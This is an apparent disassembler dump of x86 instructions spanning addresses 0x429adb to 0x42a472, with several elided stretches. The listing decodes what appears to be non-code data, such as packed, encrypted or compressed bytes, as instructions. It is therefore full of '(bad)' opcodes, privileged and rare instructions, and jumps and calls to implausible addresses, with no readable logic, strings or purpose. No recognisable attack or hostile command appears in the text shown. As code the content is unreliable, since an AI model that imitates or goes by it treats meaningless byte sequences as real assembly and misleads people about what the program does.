  429adb:	lds    ecx,FWORD PTR [ecx+0x56c7c081]
  429ae1:	inc    esp
  429ae2:	loopne 0x429add
  429ae4:	rcl    BYTE PTR [ebx+ebx*2],cl
  429ae7:	jo     0x429a88
  429ae9:	mov    esp,0xf90b6d1
  429aee:	leave  
  429aef:	enter  0x4479,0xf6
  429af3:	mov    ebx,0x8ab45ebf
  429af8:	fldcw  WORD PTR [ecx+0x488c3358]
  429afe:	int    0x68
  429b00:	loop   0x429aae
  429b02:	cld    
  429b03:	xchg   edi,eax
  429b04:	xchg   edx,eax
  429b05:	and    edx,DWORD PTR [edx]
  429b07:	cmc    
  429b08:	popa   
  429b09:	daa    
  429b0a:	leave  
  429b0b:	adc    ebp,DWORD PTR [ebx+0x6ee9a3cd]
  429b11:	gs xchg ebp,eax
  429b13:	jmp    0x429aae
  429b15:	lods   al,BYTE PTR ds:[esi]
  429b16:	fsubr  st,st(1)
  429b18:	leave  
  429b19:	bound  ebx,QWORD PTR [edi]
  429b1b:	pop    ebx
  429b1c:	mov    BYTE PTR [eax],0x11
  429b1f:	into   
  429b20:	retf   0x5870
  429b23:	dec    ecx
  429b24:	(bad)  
  429b25:	icebp  
  429b26:	outs   dx,DWORD PTR ds:[esi]
  429b27:	scas   eax,DWORD PTR es:[edi]
  429b28:	jo     0x429b10
  429b2a:	jge    0x429b8e
  429b2c:	mov    DWORD PTR [edi+edi*2+0x20594ddb],edi
  429b33:	dec    esp
  429b34:	sub    eax,0x8aedc6a3
  429b39:	mov    dh,BYTE PTR [ecx]
  429b3b:	pop    ebx
  429b3c:	add    eax,0x138d1b9f
  429b41:	mov    ebx,0x6cfe66fd
  429b46:	cmovb  ebp,DWORD PTR [ecx+0x1fb7e925]
  429b4d:	mov    eax,0x5f705866
  429b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b53:	stos   DWORD PTR es:[edi],eax
  429b54:	or     BYTE PTR [ecx],0x50
  429b57:	push   ebp
  429b58:	scas   eax,DWORD PTR es:[edi]
  429b59:	es sahf 
  429b5b:	jb     0x429b1f
  429b5d:	pusha  
  429b5e:	scas   eax,DWORD PTR es:[edi]
  429b5f:	xor    al,0x89
  429b61:	mov    al,ds:0x78426914
  429b66:	or     esp,DWORD PTR [esi-0x7f]
  429b69:	cmp    BYTE PTR [edx],cl
  429b6b:	jno    0x429b41
  429b6d:	mov    ds:0x940023a5,al
  429b72:	or     BYTE PTR [edi+0x3c],0xb
  429b76:	por    mm2,QWORD PTR [eax+0x44]
  429b7a:	sahf   
  429b7b:	pop    ebx
  429b7c:	shl    BYTE PTR [edx],1
  429b7e:	(bad)  
  429b80:	pop    ss
  429b81:	adc    esp,esi
  429b83:	cmp    ebp,edx
  429b85:	lods   eax,DWORD PTR ds:[esi]
  429b86:	mov    es,edi
  429b88:	xchg   ebp,eax
  429b89:	mov    dl,0xc1
  429b8b:	(bad)  
  429b8c:	and    ebp,DWORD PTR [ecx-0x3d18b171]
  429b92:	xor    al,0x5
  429b94:	pop    ss
  429b95:	cli    
  429b96:	int3   
  429b97:	je     0x429bb3
  429b99:	and    DWORD PTR [ebp-0x5cabe6ac],0xa21febfd
  429ba3:	sar    bl,0xd1
  429ba6:	xchg   esi,eax
  429ba7:	cmp    eax,0x2970fd2a
  429bac:	xor    DWORD PTR [esp+eiz*8-0x4f],esi
  429bb0:	push   ss
  429bb1:	adc    al,0x76
  429bb3:	rol    DWORD PTR ds:0x0,cl
	...
  429c15:	add    BYTE PTR [ebx-0x487759ea],ah
  429c1b:	mov    eax,0x52a3faf
  429c20:	xchg   esp,eax
  429c21:	pop    eax
  429c22:	loopne 0x429bef
  429c24:	xor    al,0x7
  429c26:	dec    esp
  429c27:	mov    esi,0x1070001
  429c2c:	add    BYTE PTR [eax],al
  429c2e:	mov    DWORD PTR [eax-0x4],ebx
  429c31:	pop    esp
  429c32:	cs push esi
  429c34:	add    eax,0x911fecc0
  429c39:	shl    BYTE PTR [ebp+0x15f1c6e5],0x8d
  429c40:	mov    al,ds:0x1d84536f
  429c45:	xor    eax,0x1d7d06d6
  429c4a:	sub    al,0x89
  429c4c:	hlt    
  429c4d:	inc    ecx
  429c4e:	hlt    
  429c4f:	jns    0x429c74
  429c51:	add    ebx,DWORD PTR [ebx+0x3c]
  429c54:	test   BYTE PTR [edi],ah
  429c56:	iret   
  429c57:	sub    eax,0x9bf6f45a
  429c5c:	mov    esi,0x7ee4919f
  429c61:	inc    ecx
  429c62:	int3   
  429c63:	sbb    ah,dl
  429c65:	pusha  
  429c66:	comiss xmm6,DWORD PTR [esi]
  429c69:	jmp    0xc26f:0x3ed04375
  429c70:	test   BYTE PTR [ebx+0x3d2da5f7],bh
  429c76:	adc    eax,0xe7ddb49c
  429c7b:	jno    0x429c3a
  429c7d:	cs retf 0x34ec
  429c81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429c82:	cs jp  0x429c8c
  429c85:	jg     0x429c2c
  429c87:	pop    edi
  429c88:	out    0x8c,al
  429c8a:	daa    
  429c8b:	mov    DWORD PTR [ebx+0x2bf7b041],eax
  429c91:	mov    ds:0x42ef7fd3,al
  429c96:	xor    bl,ch
  429c98:	shl    bh,cl
  429c9a:	fxch   st(2)
  429c9c:	inc    esp
  429c9d:	xchg   BYTE PTR [ebx+0x78],dl
  429ca0:	mov    bh,bl
  429ca2:	hlt    
  429ca3:	lods   eax,DWORD PTR ds:[esi]
  429ca4:	loope  0x429c6d
  429ca6:	mov    esp,0x3a4936be
  429cab:	(bad)  
  429cac:	sub    esp,DWORD PTR [ebx-0xa]
  429caf:	outs   dx,DWORD PTR ds:[esi]
  429cb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429cb1:	das    
  429cb2:	push   eax
  429cb3:	add    BYTE PTR [edi-0x33],dl
  429cb6:	jbe    0x429cb2
  429cb8:	mov    bl,0x79
  429cba:	inc    esi
  429cbb:	adc    bh,BYTE PTR [ebp+ebx*4+0x54]
  429cbf:	cld    
  429cc0:	inc    eax
  429cc1:	push   ds
  429cc2:	iret   
  429cc3:	outs   dx,BYTE PTR ds:[esi]
  429cc4:	lods   eax,DWORD PTR ds:[esi]
  429cc5:	push   ebp
  429cc6:	jnp    0x429c6d
  429cc8:	mov    bl,0x8e
  429cca:	jl     0x429d22
  429ccc:	xor    BYTE PTR [ebx],dh
  429cce:	lock clc 
  429cd0:	mov    WORD PTR [eax+0x710695a9],?
  429cd6:	jnp    0x429c89
  429cd8:	xchg   DWORD PTR [ebx],ecx
  429cda:	ins    DWORD PTR es:[edi],dx
  429cdb:	mov    ecx,DWORD PTR [esi]
  429cdd:	bound  ebp,QWORD PTR [edx]
  429cdf:	mov    ah,BYTE PTR [ecx+0x9]
  429ce2:	push   ebx
  429ce3:	popf   
  429ce4:	xchg   ebx,eax
  429ce5:	xor    DWORD PTR [ebp+0x38e24ff4],0x4
  429cec:	aaa    
  429ced:	aad    0x6b
  429cef:	adc    al,0xe1
  429cf1:	push   ss
  429cf2:	outs   dx,DWORD PTR ds:[esi]
  429cf3:	int    0x13
  429cf5:	inc    DWORD PTR [edx+edx*8+0x0]
  429cf9:	pop    ebp
  429cfa:	mov    edi,0x662e6b10
  429cff:	inc    ebx
  429d00:	inc    ecx
  429d01:	dec    ebx
  429d02:	fmul   DWORD PTR [edi-0x61f97d96]
  429d08:	or     al,0xcb
  429d0a:	pop    edi
  429d0b:	imul   edx,DWORD PTR [edi+ebp*4],0xffffffe6
  429d0f:	fisub  WORD PTR ds:0xb6468b91
  429d15:	in     al,dx
  429d16:	mov    al,0x74
  429d18:	retf   
  429d19:	add    DWORD PTR [ebx+0x43],esi
  429d1c:	or     al,0xb0
  429d1e:	xchg   ebp,eax
  429d1f:	mov    dh,0xd7
  429d21:	xchg   esi,eax
  429d22:	repnz jmp 0x3113:0x2a4936f7
  429d2a:	xchg   ecx,eax
  429d2b:	int3   
  429d2c:	popa   
  429d2d:	leave  
  429d2e:	add    al,0xf6
  429d30:	sbb    DWORD PTR [esi],eax
  429d32:	clc    
  429d33:	je     0x429cfb
	...
  429d95:	add    BYTE PTR [ebx-0x13f33b49],bl
  429d9b:	jg     0x429d78
  429d9d:	mov    bh,0xb8
  429d9f:	xor    al,0xdf
  429da1:	sub    eax,0xa271dd64
  429da6:	push   ebx
  429da7:	mov    edi,0x1070001
  429dac:	add    BYTE PTR [eax],al
  429dae:	xor    al,0xcc
  429db0:	add    dh,dl
  429db2:	adc    BYTE PTR [ecx],al
  429db4:	xchg   DWORD PTR [edi-0x59508345],edi
  429dba:	xor    al,0xdd
  429dbc:	mov    ds:0xef2c9a5d,eax
  429dc1:	rcr    DWORD PTR [edi+0x62c3468c],1
  429dc7:	lahf   
  429dc8:	in     al,dx
  429dc9:	add    DWORD PTR [ecx-0x2],ebx
  429dcc:	idiv   DWORD PTR [edx-0x30f7384c]
  429dd2:	pop    ss
  429dd3:	das    
  429dd4:	mov    eax,ds:0x74b3a283
  429dd9:	(bad)  
  429dda:	push   ss
  429ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ddc:	mov    al,ds:0xbe22e1b1
  429de1:	retf   0x691f
  429de4:	push   ds
  429de5:	outs   dx,DWORD PTR ds:[esi]
  429de6:	int    0xad
  429de8:	neg    BYTE PTR [edi-0x36]
  429deb:	stos   DWORD PTR es:[edi],eax
  429dec:	push   0x3c
  429dee:	xor    al,0x92
  429df0:	jle    0x429e01
  429df2:	stos   DWORD PTR es:[edi],eax
  429df3:	fs xchg cl,ch
  429df6:	xor    al,0xf2
  429df8:	jae    0x429dbe
  429dfa:	cmp    al,0x71
  429dfc:	sti    
  429dfd:	std    
  429dfe:	jecxz  0x429d9a
  429e00:	add    eax,esp
  429e02:	jmp    0xb085062
  429e07:	popa   
  429e08:	add    BYTE PTR [ebp-0x3b3ac62b],0xe1
  429e0f:	cmp    bh,BYTE PTR [ebp+0xf]
  429e12:	pop    ebx
  429e13:	stc    
  429e14:	iret   
  429e15:	xchg   edx,eax
  429e16:	(bad)  
  429e17:	in     eax,dx
  429e18:	xchg   DWORD PTR [eax+0x3daddc63],eax
  429e1e:	es leave 
  429e20:	outs   dx,BYTE PTR ds:[esi]
  429e21:	pushf  
  429e22:	mov    al,0xcf
  429e24:	cld    
  429e25:	adc    dh,0xe9
  429e28:	imul   ebp,DWORD PTR [edx+0x5a1cd1f],0x3ca089c8
  429e32:	pop    esp
  429e33:	add    ax,0x4f4a
  429e37:	mov    ebp,0x3d010c50
  429e3c:	(bad)  
  429e3d:	and    eax,DWORD PTR [edx-0xb]
  429e40:	mov    ds:0xd9e376f7,eax
  429e45:	and    BYTE PTR [esi-0x11],dh
  429e48:	jg     0x429dfe
  429e4a:	cmp    eax,0x315f65c2
  429e4f:	sub    dh,BYTE PTR [edi+esi*8-0x6d]
  429e53:	mov    esi,eax
  429e55:	int3   
  429e56:	scas   eax,DWORD PTR es:[edi]
  429e57:	rol    esp,1
  429e59:	jg     0x429ebe
  429e5b:	adc    ch,dl
  429e5d:	ss and ecx,esp
  429e60:	and    edx,DWORD PTR [edx+0x51622f9c]
  429e66:	lgs    ebp,FWORD PTR [ebx+0x2b]
  429e6a:	pop    ecx
  429e6b:	not    BYTE PTR [esi+edi*8-0x388af3f]
  429e72:	hlt    
  429e73:	sub    DWORD PTR [eax+ebx*4+0x3e364e9b],edi
  429e7a:	shl    DWORD PTR [esi],cl
  429e7c:	cmp    al,0x30
  429e7e:	jbe    0x429e78
  429e80:	xor    BYTE PTR [eax-0x15],ah
  429e83:	fnstenv [edi*2+0x1a2be746]
  429e8a:	pop    edx
  429e8b:	fld    QWORD PTR [ebx-0x51]
  429e8e:	or     dh,bh
  429e90:	sahf   
  429e91:	ret    
  429e92:	loop   0x429e95
  429e94:	getsec 
  429e96:	rol    DWORD PTR [ebx-0x60],cl
  429e99:	cwde   
  429e9a:	add    eax,0xe15e2229
  429e9f:	shl    DWORD PTR [eax+0x3a],1
  429ea2:	stos   DWORD PTR es:[edi],eax
  429ea3:	push   edx
  429ea4:	out    dx,eax
  429ea5:	psrad  mm1,QWORD PTR [esi+0x1460aa92]
  429eac:	sbb    al,0xc8
  429eae:	sub    al,0xad
  429eb0:	inc    di
  429eb2:	mov    esi,0xb896
	...
  429f13:	add    BYTE PTR [eax],al
  429f15:	add    BYTE PTR [ecx],dh
  429f17:	inc    ebp
  429f18:	enter  0xfc06,0x8f
  429f1c:	push   DWORD PTR [edi+0x54]
  429f1f:	into   
  429f20:	fnstcw WORD PTR ds:0xc1a73ea6
  429f26:	pop    edx
  429f27:	rol    BYTE PTR [ecx],0x0
  429f2a:	pop    es
  429f2b:	add    DWORD PTR [eax],eax
  429f2d:	add    BYTE PTR [ebx],cl
  429f2f:	push   edx
  429f30:	dec    edx
  429f31:	push   ecx
  429f32:	xchg   edx,eax
  429f33:	sub    bl,BYTE PTR [esi]
  429f35:	jmp    0xca27:0x71b57e8f
  429f3c:	std    
  429f3d:	fdiv   st,st(1)
  429f3f:	sti    
  429f40:	out    dx,al
  429f41:	push   edi
  429f42:	call   0x149f6af6
  429f47:	mov    ebp,0x5c6d8e8a
  429f4c:	mov    ah,0x80
  429f4e:	pushf  
  429f4f:	fcom   st(4)
  429f51:	or     eax,0x25c2c4d9
  429f56:	ins    BYTE PTR es:[edi],dx
  429f57:	add    DWORD PTR [eax-0x37],ecx
  429f5a:	ret    0x39fd
  429f5d:	and    bl,dl
  429f5f:	cmc    
  429f60:	cmp    DWORD PTR [esi+0x55],ecx
  429f63:	pusha  
  429f64:	nop
  429f65:	adc    al,0x92
  429f67:	dec    ebx
  429f68:	inc    ecx
  429f69:	mov    esp,0x3de783f4
  429f6e:	xchg   edx,eax
  429f6f:	ins    DWORD PTR es:[edi],dx
  429f70:	jns    0x429fa9
  429f72:	and    al,BYTE PTR [edi+0x6f7809a3]
  429f78:	popf   
  429f79:	sbb    bl,BYTE PTR [edx+0x3]
  429f7c:	out    0xcb,al
  429f7e:	pop    ss
  429f7f:	(bad)  
  429f81:	arpl   WORD PTR [ecx+edi*2],bp
  429f84:	sbb    BYTE PTR [esi-0x3b3045a4],dh
  429f8a:	iret   
  429f8b:	cmp    DWORD PTR [edx],ebp
  429f8d:	aas    
  429f8e:	dec    esp
  429f8f:	xor    bl,ch
  429f91:	sbb    DWORD PTR [ecx],edx
  429f93:	pop    esp
  429f94:	jge    0x429f25
  429f96:	xchg   edx,eax
  429f97:	xlat   BYTE PTR ds:[ebx]
  429f98:	stos   DWORD PTR es:[edi],eax
  429f99:	adc    al,0x10
  429f9b:	xor    eax,0x879444c
  429fa0:	pop    eax
  429fa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429fa2:	mov    bh,0xb8
  429fa4:	cmp    al,0xd7
  429fa6:	pop    ebp
  429fa7:	imul   edx,DWORD PTR [esi-0x54],0x1d
  429fab:	scas   eax,DWORD PTR es:[edi]
  429fac:	dec    esp
  429fad:	pop    ebp
  429fae:	out    0xc9,eax
  429fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429fb1:	addr16 ja 0x42a001
  429fb4:	call   0xca5f911b
  429fb9:	xor    al,bh
  429fbb:	mov    al,ds:0x538b2a28
  429fc0:	icebp  
  429fc1:	push   eax
  429fc2:	jmp    0x466:0x107ab2d1
  429fc9:	inc    ebp
  429fca:	mov    dl,0x73
  429fcc:	and    ah,BYTE PTR [edx]
  429fce:	adc    eax,0xc7b4b8cb
  429fd3:	push   esi
  429fd4:	mov    edi,ecx
  429fd6:	jo     0x429f61
  429fd8:	mov    dl,0x3b
  429fda:	sub    DWORD PTR [ecx-0x1b],esp
  429fdd:	jns    0x42a055
  429fdf:	xor    eax,0xf038f597
  429fe4:	out    0x1d,al
  429fe6:	xor    eax,ebx
  429fe8:	movd   DWORD PTR [eax],mm1
  429feb:	push   esi
  429fec:	shufps xmm5,XMMWORD PTR [ecx-0x5848ccd5],0xb1
  429ff4:	imul   ebx,ebp,0x6e
  429ff7:	mov    ebx,0x223c5608
  429ffc:	aam    0x5e
  429ffe:	xchg   ebp,eax
  429fff:	lods   eax,DWORD PTR ds:[esi]
  42a000:	sub    eax,0xf97fa245
  42a005:	test   al,0x80
  42a007:	test   al,dl
  42a009:	mov    al,0xef
  42a00b:	push   edi
  42a00c:	aad    0xd
  42a00e:	mov    eax,0x5b02a715
  42a013:	push   ds
  42a014:	jp     0x42a064
  42a016:	xor    ah,ch
  42a018:	cwde   
  42a019:	pop    ss
  42a01a:	mov    ebp,0x59d9f792
  42a01f:	aaa    
  42a020:	xor    esi,DWORD PTR [edx+0x4a89896]
  42a026:	iret   
  42a027:	mov    edi,0xf4c9ab2f
  42a02c:	or     ecx,edx
  42a02e:	ss add eax,0xf33452e1
  42a034:	arpl   WORD PTR [eax],ax
	...
  42a096:	xlat   BYTE PTR ds:[ebx]
  42a097:	pushf  
  42a098:	shr    BYTE PTR [ebp-0x1000235],0x30
  42a09f:	xchg   esi,eax
  42a0a0:	mov    esi,0x8d3edc4e
  42a0a5:	inc    esp
  42a0a6:	popa   
  42a0a7:	rol    DWORD PTR [ecx],0x0
  42a0aa:	pop    es
  42a0ab:	add    DWORD PTR [eax],eax
  42a0ad:	add    BYTE PTR [edx],bl
  42a0af:	dec    edx
  42a0b0:	mov    ds:0x69947f79,al
  42a0b5:	aam    0xf4
  42a0b7:	outs   dx,DWORD PTR ds:[esi]
  42a0b8:	mov    dl,0x60
  42a0ba:	adc    al,0xea
  42a0bc:	push   esi
  42a0bd:	xor    al,bl
  42a0bf:	and    cl,BYTE PTR [ebx-0x2f]
  42a0c2:	xlat   BYTE PTR ds:[ebx]
  42a0c3:	dec    BYTE PTR [edx+0x7d]
  42a0c6:	repz mul dl
  42a0c9:	cmp    ah,ah
  42a0cb:	sahf   
  42a0cc:	sti    
  42a0cd:	in     eax,0x9
  42a0cf:	out    dx,al
  42a0d0:	outs   dx,BYTE PTR ds:[esi]
  42a0d1:	mov    edx,0x555e5a4f
  42a0d6:	jl     0x42a0d3
  42a0d8:	outs   dx,DWORD PTR ds:[esi]
  42a0d9:	mov    ebx,0x6294e74b
  42a0de:	(bad)  [edx+0x6943c5f]
  42a0e4:	cdq    
  42a0e5:	leave  
  42a0e6:	out    dx,al
  42a0e7:	lds    ebp,FWORD PTR [edx+0x25]
  42a0ea:	idiv   BYTE PTR [esi]
  42a0ec:	jge    0x42a0d9
  42a0ee:	pop    esp
  42a0ef:	imul   ebp,edx,0x60
  42a0f2:	in     eax,dx
  42a0f3:	std    
  42a0f4:	je     0x42a167
  42a0f6:	aad    0x40
  42a0f8:	sub    DWORD PTR [edi+0x28519262],esi
  42a0fe:	xchg   esp,eax
  42a0ff:	fld    QWORD PTR [esi]
  42a101:	sbb    ebx,DWORD PTR [ecx+0x14]
  42a104:	adc    esi,edx
  42a106:	adc    DWORD PTR [ebp-0x18],0x3c
  42a10a:	repz bound esi,QWORD PTR fs:[ebx-0xe]
  42a10f:	xor    al,0xbb
  42a111:	dec    esp
  42a112:	call   0xa81a8fb7
  42a117:	xchg   esp,eax
  42a118:	and    esi,DWORD PTR [edi+0xe]
  42a11b:	mov    bh,0xe
  42a11d:	adc    al,0x49
  42a11f:	pop    edi
  42a120:	(bad)  
  42a121:	xchg   esi,eax
  42a122:	mov    dl,0x56
  42a124:	xor    BYTE PTR [eax-0x3b],ch
  42a127:	adc    BYTE PTR [edx-0x20],0x6b
  42a12b:	cwde   
  42a12c:	mov    ah,0x5a
  42a12e:	dec    ebx
  42a12f:	or     al,0x8c
  42a131:	jae    0x42a17d
  42a133:	aaa    
  42a134:	fucom  st(2)
  42a136:	lahf   
  42a137:	lahf   
  42a138:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13a:	or     eax,0x66d7ae0a
  42a13f:	clc    
  42a140:	popf   
  42a141:	(bad)  
  42a143:	pcmpgtb mm6,QWORD PTR [ecx-0x1db18ec1]
  42a14a:	(bad)  
  42a14b:	out    dx,eax
  42a14c:	scas   al,BYTE PTR es:[edi]
  42a14d:	inc    edx
  42a14e:	xchg   ebp,eax
  42a14f:	out    0xc2,al
  42a151:	push   edi
  42a152:	(bad)  
  42a153:	and    ebp,DWORD PTR [eax+edi*4+0x4d]
  42a157:	imul   esp,DWORD PTR [eax+0x7f],0x93fe66d9
  42a15e:	push   esp
  42a15f:	xor    eax,0x7e165f88
  42a164:	scas   al,BYTE PTR es:[edi]
  42a165:	int3   
  42a166:	mov    eax,ds:0xfe42472
  42a16b:	add    al,0x1a
  42a16d:	push   edi
  42a16e:	xchg   esp,eax
  42a16f:	inc    ecx
  42a170:	inc    esi
  42a171:	mov    ebx,0xeedc8099
  42a176:	(bad)  
  42a177:	dec    esi
  42a178:	and    BYTE PTR [ebp+0x2756aa93],ah
  42a17e:	ss mov edx,0x7fce18ec
  42a184:	push   0x3b8a9e7d
  42a189:	inc    eax
  42a18a:	sbb    BYTE PTR ds:0x6eb25e61,bh
  42a190:	hlt    
  42a191:	rcr    BYTE PTR [eax],cl
  42a193:	sub    ah,bh
  42a195:	outs   dx,BYTE PTR ds:[esi]
  42a196:	fstp   TBYTE PTR ds:0x9b494abd
  42a19c:	push   es
  42a19d:	mov    ebp,0xc85dfa72
  42a1a2:	adc    al,0xac
  42a1a4:	loope  0x42a18f
  42a1a6:	aad    0x3c
  42a1a8:	or     BYTE PTR [eax+0x27],al
  42a1ab:	les    ebx,FWORD PTR [edx+0x7a]
  42a1ae:	xor    eax,0xc2b532fb
  42a1b3:	and    edx,edx
	...
  42a215:	add    BYTE PTR [ebx],ch
  42a217:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a21d:	mov    bh,0x15
  42a21f:	fucomip st,st(5)
  42a221:	imul   eax,DWORD PTR [ecx+0x6813a965],0x70001c2
  42a22b:	add    DWORD PTR [eax],eax
  42a22d:	add    BYTE PTR [edx+eax*4],ch
  42a230:	retw   0xf826
  42a234:	test   al,0x73
  42a236:	cli    
  42a237:	dec    edx
  42a238:	add    eax,0x4a7081e8
  42a23d:	dec    edi
  42a23e:	int    0x73
  42a240:	xor    DWORD PTR [edi+0x7b],esi
  42a243:	jg     0x42a1df
  42a245:	data16 lahf 
  42a247:	loopne 0x42a26e
  42a249:	imul   edi,DWORD PTR [edi+0x1f99e92b],0x18
  42a250:	mov    ds:0xdb2cccb,al
  42a255:	mov    eax,ds:0x29babcca
  42a25a:	das    
  42a25b:	fild   QWORD PTR [ecx-0x3e3c7b1a]
  42a261:	mov    edi,0xb1d6b458
  42a266:	(bad)  
  42a267:	mov    edi,0xf468cbf2
  42a26c:	jb     0x42a24e
  42a26e:	mov    ds:0xf47de0a3,al
  42a273:	fisttp QWORD PTR [esi+edx*8-0x1]
  42a277:	push   es
  42a278:	jmp    0x42a276
  42a27a:	loop   0x42a253
  42a27c:	push   ecx
  42a27d:	call   0xf553d6e3
  42a282:	sub    ebx,DWORD PTR [ebp-0x45]
  42a285:	outs   dx,BYTE PTR ds:[esi]
  42a286:	jmp    0x8eed:0x30b145b3
  42a28d:	add    BYTE PTR [ebp+0x21],0xb6
  42a291:	sub    ah,BYTE PTR [ecx+0x574004eb]
  42a297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a298:	xor    eax,0xed67ffb0
  42a29d:	pop    eax
  42a29e:	(bad)  
  42a29f:	push   ebp
  42a2a0:	call   0xc7f8bbec
  42a2a5:	test   al,0x10
  42a2a7:	cmp    DWORD PTR [ebp+0x50],ecx
  42a2aa:	int    0xd2
  42a2ac:	xor    al,0x6b
  42a2ae:	fadd   QWORD PTR [ebx-0x3efd818c]
  42a2b4:	push   0xb4f82975
  42a2b9:	pop    es
  42a2ba:	dec    DWORD PTR [edx]
  42a2bc:	stos   BYTE PTR es:[edi],al
  42a2bd:	into   
  42a2be:	sub    BYTE PTR [eax-0x78],bh
  42a2c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2c2:	fsubr  st,st(4)
  42a2c4:	mov    esi,0x84cf4381
  42a2c9:	add    dh,BYTE PTR [ecx+edi*1+0xc]
  42a2cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2ce:	or     DWORD PTR [ecx-0x33],esp
  42a2d1:	dec    ebx
  42a2d2:	mov    al,0xe2
  42a2d4:	lods   al,BYTE PTR ds:[esi]
  42a2d5:	lea    ecx,[esi+esi*4-0xe]
  42a2d9:	rcr    DWORD PTR [esi+0x9a11b55],0x25
  42a2e0:	sar    DWORD PTR ss:[edx],1
  42a2e3:	push   ebx
  42a2e4:	fsub   QWORD PTR [esi+0x5f]
  42a2e7:	call   0x70cb03dc
  42a2ec:	int3   
  42a2ed:	repnz cmc 
  42a2ef:	addr16 mov edx,esp
  42a2f2:	mov    dl,0x68
  42a2f4:	xchg   ecx,esp
  42a2f6:	fcomp  DWORD PTR [edi]
  42a2f8:	in     al,dx
  42a2f9:	int3   
  42a2fa:	retf   
  42a2fb:	jg     0x42a2e2
  42a2fd:	sti    
  42a2fe:	lods   eax,DWORD PTR ds:[esi]
  42a2ff:	add    BYTE PTR [edx],bl
  42a301:	inc    edx
  42a302:	jl     0x42a29f
  42a304:	pusha  
  42a305:	mov    cl,0xe2
  42a307:	xchg   edi,eax
  42a308:	shl    BYTE PTR [eax+0x32],1
  42a30b:	fstp   DWORD PTR [edx+esi*4]
  42a30e:	sub    al,0xb7
  42a310:	sub    eax,0x6ef10f6e
  42a315:	adc    ecx,DWORD PTR [esi+esi*4]
  42a318:	jmp    0x5e071138
  42a31d:	and    BYTE PTR [ebp+0x50],dl
  42a320:	pop    edx
  42a321:	(bad)  
  42a322:	shl    DWORD PTR [eax+esi*4-0x2f31b371],1
  42a329:	sub    DWORD PTR [ebp+0x3cba8c26],0x4c52b752
  42a333:	nop
  42a334:	add    DWORD PTR [eax],0x0
	...
  42a396:	jg     0x42a3a6
  42a398:	jne    0x42a3d5
  42a39a:	jne    0x42a417
  42a39c:	jg     0x42a3ec
  42a39e:	ds loop 0x42a3ca
  42a3a1:	retf   0x7555
  42a3a4:	lock xchg edx,eax
  42a3a6:	outs   dx,DWORD PTR ds:[esi]
  42a3a7:	ret    
  42a3a8:	add    DWORD PTR [eax],eax
  42a3aa:	pop    es
  42a3ab:	add    DWORD PTR [eax],eax
  42a3ad:	add    BYTE PTR [edx-0x23],bl
  42a3b0:	xor    DWORD PTR [ebx+0x49],eax
  42a3b3:	or     ebp,DWORD PTR [esi+0x5f]
  42a3b6:	sar    cl,0x67
  42a3b9:	iret   
  42a3ba:	inc    edi
  42a3bb:	sbb    al,0xf3
  42a3bd:	ficom  DWORD PTR [edx]
  42a3bf:	and    al,0x4b
  42a3c1:	xchg   esi,eax
  42a3c2:	shl    BYTE PTR [edx],cl
  42a3c4:	or     al,bl
  42a3c6:	lods   al,BYTE PTR ds:[esi]
  42a3c7:	add    dh,dh
  42a3c9:	adc    edx,DWORD PTR [ecx]
  42a3cb:	hlt    
  42a3cc:	xor    al,BYTE PTR [esi+ebp*1]
  42a3cf:	pop    edx
  42a3d0:	mov    dh,0x54
  42a3d2:	ins    DWORD PTR es:[edi],dx
  42a3d3:	cmp    eax,DWORD PTR [ebp-0x4f]
  42a3d6:	or     ebp,DWORD PTR [ecx]
  42a3d8:	popf   
  42a3d9:	inc    edi
  42a3da:	sbb    esp,DWORD PTR [esi]
  42a3dc:	cmp    al,0xd8
  42a3de:	mov    esp,0x5e435f7e
  42a3e3:	sahf   
  42a3e4:	shr    bh,1
  42a3e6:	inc    edx
  42a3e7:	repz sub DWORD PTR [ebp+ebx*2+0x74a0ee04],esi
  42a3ef:	popf   
  42a3f0:	ss int3 
  42a3f2:	(bad)
  42a3f5:	mov    ch,0x12
  42a3f7:	push   ebp
  42a3f8:	and    al,0xe2
  42a3fa:	pop    eax
  42a3fb:	dec    ebx
  42a3fc:	ret    
  42a3fd:	dec    esi
  42a3fe:	ror    BYTE PTR [ebx+0x1a841226],1
  42a404:	mov    edi,DWORD PTR [edi+0x16767027]
  42a40a:	mov    bl,0xe9
  42a40c:	or     ch,BYTE PTR [ebx]
  42a40e:	cmc    
  42a40f:	sbb    BYTE PTR [edi],ah
  42a411:	jno    0x42a426
  42a413:	retf   0x90ba
  42a416:	pop    ebp
  42a417:	aam    0x9d
  42a419:	or     al,0x1c
  42a41b:	push   ds
  42a41c:	adc    edi,eax
  42a41e:	sbb    eax,0x498744bd
  42a423:	jb     0x42a490
  42a425:	add    al,0xe7
  42a427:	push   ebx
  42a428:	and    bh,cl
  42a42a:	repnz in eax,dx
  42a42c:	sub    al,0x78
  42a42e:	fdivr  DWORD PTR [esi-0x5f]
  42a431:	pop    eax
  42a432:	mov    al,BYTE PTR [esi-0x59622d92]
  42a438:	out    0xea,al
  42a43a:	jno    0x42a44e
  42a43c:	add    al,0x54
  42a43e:	sbb    eax,0x211a72a7
  42a443:	outs   dx,DWORD PTR ds:[esi]
  42a444:	mov    ds:0xdb8ce544,al
  42a449:	ins    BYTE PTR es:[edi],dx
  42a44a:	aas    
  42a44b:	jns    0x42a422
  42a44d:	or     ecx,ebp
  42a44f:	das    
  42a450:	cdq    
  42a451:	prefetch BYTE PTR [ebx]
  42a454:	inc    edi
  42a455:	fild   WORD PTR [ecx-0xf]
  42a458:	xchg   esi,eax
  42a459:	cmp    al,0xd7
  42a45b:	xchg   ebx,eax
  42a45c:	jb     0x42a48f
  42a45e:	sub    cl,BYTE PTR [ebp-0x2ad799a3]
  42a464:	xor    BYTE PTR [esi],dl
  42a466:	test   eax,0xe0a935e7
  42a46b:	push   ds
  42a46c:	mov    ah,0x27
  42a46e:	retf   
  42a46f:	inc    edx
  42a470:	and    edi,DWORD PTR [ebx]
  42a472:	sahf   
